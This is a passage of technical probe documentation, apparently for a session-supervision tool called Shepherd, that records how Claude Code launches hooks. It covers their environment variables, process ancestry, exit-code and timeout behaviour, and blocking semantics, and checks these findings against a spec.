- **Consumed by:** §8 `hookd.py` (lines 895–909: 250 ms UDS, always exit 0); §5.0 (line 312, 0600 socket); principle 4 (line 163); D37; §18 volume risk; M1
- **Probe:** `run_probes.py S01 S07 R01 R02` (+ `capture_env.py`). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S07 R01 R02`
- **Status:** partially verified — ancestry, stdin, env, exit 0/1/2, per-entry timeout, blocking and `async` are live 2026-09-14. From the binary only: the 600 s default timeout (`Mp=600000`; the debug line shows it only for an async hook) and the interactive trust skip. The kill-at-exit cause is inferred (see StopFailure). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `live/S01_startup_tools/env.jsonl` [SessionStart env], `live/R01_exit_codes/stdout.jsonl`, `live/R02_timeout_sync/stdout.jsonl`, `live/R02_timeout_sync/timing.txt`, `live/S01_startup_tools/events.jsonl` [ancestry])

```json
"_env": {..., "CLAUDECODE": "1", "CLAUDE_CODE_CHILD_SESSION": "1", "CLAUDE_CODE_ENTRYPOINT": "sdk-cli", "CLAUDE_CODE_MESSAGING_SOCKET": "/run/user/0/cc-socks/4033475.sock", "CLAUDE_CODE_MESSAGING_TOKEN": "<redacted>", "CLAUDE_CODE_SESSION_ATTENDED": "0", "CLAUDE_CODE_SESSION_ID": "8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6", "CLAUDE_ENV_FILE": "/root/.claude/session-env/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6/sessionstart-hook-1.sh", "CLAUDE_PID": "4033475", "CLAUDE_PROJECT_DIR": "/tmp/shp-hooks-base-dwqg6d95", "COREPACK_ENABLE_AUTO_PIN": "0", ..., "GIT_EDITOR": "true", "HOME": "/root", "LANG": "en_US.UTF-8", ..., "NoDefaultCurrentDirectoryInExePath": "1", "OLDPWD": "/root/Shepherd", "PATH": "/root/.local/bin:/root/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/root/src/cc10x-qa/plugins/cc10x/bin", "PWD": "/tmp/shp-hooks-base-dwqg6d95", "SHELL": "/bin/bash", "SHLVL": "4", "SHP_CLAUDE_VERSION": "2.1.270 (Claude Code)", ..., "TERM": "tmux-256color", ..., "TMUX": "/tmp/tmux-0/shepherd,3971391,0", ..., "USER": "root", ..., "_": "/usr/bin/python3"}
"_hook_pid":4033513,"_claude_pid":4033475,"_ancestry":[{"pid":4033513,"comm":"capture_hook.sh","ppid":4033512},{"pid":4033512,"comm":"sh","ppid":4033475},{"pid":4033475,"comm":"claude","ppid":4033472},{"pid":4033472,"comm":"python3","ppid":4033470},{"pid":4033470,"comm":"bash","ppid":3971404},{"pid":3971404,"comm":"claude","ppid":3971392},{"pid":3971392,"comm":"bash","ppid":3971391},{"pid":3971391,"comm":"tmux: server","ppid":1}]
{"type":"system","subtype":"hook_response","hook_id":"88858f1a-4a57-4948-8418-9b130b369003","hook_name":"PreToolUse:Bash","hook_event":"PreToolUse","output":"SHP_BLOCKED_BY_HOOK exit 2\n","stdout":"","stderr":"SHP_BLOCKED_BY_HOOK exit 2\n","exit_code":2,"outcome":"error","uuid":"0e25c67b-b9fb-456f-9df0-2e0527235c95","session_id":"471c725e-934f-485e-add0-50f63754a7e6"}
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"PreToolUse:Bash hook error: [/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/block_exit2.sh]: SHP_BLOCKED_BY_HOOK exit 2\n","is_error":true,"tool_use_id":"toolu_01D9Fit8sZFzwP8RgixeqGtw"}]},"parent_tool_use_id":null,"session_id":"471c725e-934f-485e-add0-50f63754a7e6","uuid":"b2e010ce-7e8d-4956-a0ee-37df0e6cf55b","timestamp":"2026-09-14T15:25:50.876Z","tool_use_result":"Error: PreToolUse:Bash hook error: [/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/R01_exit_codes/block_exit2.sh]: SHP_BLOCKED_BY_HOOK exit 2\n","tool_result_meta":[{"id":"toolu_01D9Fit8sZFzwP8RgixeqGtw","non_execution_kind":"permission-rule"}]}
{"type":"system","subtype":"hook_response","hook_id":"40960f32-da12-404f-9f10-858d4620003b","hook_name":"PreToolUse:Bash","hook_event":"PreToolUse","output":"","stdout":"","stderr":"","exit_code":1,"outcome":"cancelled","uuid":"50fd3eb4-5a8e-4876-90f7-088b7ef698b8","session_id":"2816eb1e-ca74-41c1-87ec-35feadc38c89"}
```

```text
ups_async_sleep5 start 15:25:58.155 pid=4037616
pre_timeout2_sleep8 start 15:25:59.665 pid=4037627
post_sleep3 start 15:26:01.772 pid=4037682
ups_async_sleep5 end 15:26:03.160
post_sleep3 end 15:26:04.774
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| process | — | always | `claude` → `/bin/sh -c <command>` (dash) → hook | 429/429 captures: parent `sh`, grandparent `claude`. Owning pid = first ancestor with comm `claude` = `$CLAUDE_PID` |
| stdin | bytes | always | payload JSON + `\n`, then EOF; not a tty | open fds 0,1,2 (plus the probe's own directory-listing fd) |
| hook cwd | path | always | session `cwd` | |
| `CLAUDE_PID` | env | always (every env capture: SessionStart, UserPromptSubmit, PreToolUse, Stop, SessionEnd in S01; PreToolUse, Stop in S10) | owning claude pid | |
| `CLAUDE_CODE_SESSION_ID` | env | always | = payload `session_id` | |
| `CLAUDE_PROJECT_DIR` | env | always | launch dir | |
| `CLAUDECODE`, `CLAUDE_CODE_ENTRYPOINT`, `CLAUDE_CODE_SESSION_ATTENDED`, `CLAUDE_CODE_CHILD_SESSION` | env | always | `1`, `sdk-cli` (`-p`), `0`, `1` | |
| `CLAUDE_CODE_MESSAGING_SOCKET` / `_TOKEN` | env | sometimes | not on SessionEnd | token value `<redacted>` |
| `CLAUDE_ENV_FILE` | env | SessionStart only | `~/.claude/session-env/<sid>/sessionstart-hook-1.sh` | |
| `CLAUDE_EFFORT` | env | when effort applies | `low` (S10 PreToolUse/Stop) | absent for haiku |
| exit 0 | — | — | success; stdout parsed as JSON if it starts with `{`, else plain text (UserPromptSubmit stdout became model context) | |
| exit 2 | — | — | PreToolUse: call blocked, stderr sent to the model as `tool_result` `is_error:true`, `outcome:"error"` | |
| exit 1 | — | — | non-blocking error (`Stop` exit 1 → `outcome:"error"`, session finished normally) | |
| timeout | seconds | per entry | `timeout: 2` on an 8 s sleep → killed at ~2.1 s (`end` line never written), `exit_code:1`, `outcome:"cancelled"`, tool then ran | default 600 s |
| synchronicity | — | — | blocking: a 3 s PostToolUse hook delayed the next event (PostToolBatch) by 3.0 s; hooks for one event start in parallel (capture and slow hook started 4 ms apart) | `async:true` → backgrounded (debug `Registering async hook … with timeout 600000ms`) |

**Variants and edge cases:**
- **`-p` shutdown kills slow hooks.** A StopFailure hook still running when the CLI exits appears to be killed: the Python capture was lost and the fork-free bash capture kept, 2/2 (`live/S07_bad_model/debug-hooklines.txt`, `live/R04_settings_flag/debug-hooklines.txt`). Audit: this was not observed for SessionEnd, where the Python hook in S01 completed with status 0.
- Hooks run in never-trusted directories under `-p`; the binary skips all hooks when workspace trust is not accepted in interactive mode (`Skipping … hook execution - workspace trust not accepted`, `binary/runtime-source-snippets.txt` line 12).
- `--include-hook-events` with `--output-format stream-json` emits `hook_started`/`hook_response` system messages (hook name, exit code, stdout, stderr, outcome) — an alternative signal path for `owned` sessions.
- The environment is inherited from the launching process (here `TMUX`, `TERM`, a plugin `PATH` entry leaked from the parent).

**Spec alignment:**
- spec lines 897–907 (`hookd.py` reads stdin, 250 ms UDS write, always exit 0): contract aligned (exit 0 is non-blocking, stdin closes). Timing risk: a Python `hookd` of the shape shown (interpreter start + UDS connect) is exactly what was lost on `-p` StopFailure in S07 and R04. The StopFailure path needs a hook that finishes in a few ms, or a fallback on process exit. Without one, S07 (exit 1, StopFailure lost) would classify as `crashed` (line 964) instead of `bad_request`.
- spec line 163 ("Hooks time out"): the per-entry `timeout` is enforced by Claude Code (R02) — Shepherd's install should set it, since the default is 600 s of blocking.
- Owning-pid discovery: `$CLAUDE_PID` in the hook env equals the `claude` parent of the hook's `sh` (S01 env vs ancestry) — no `/proc` walk needed.
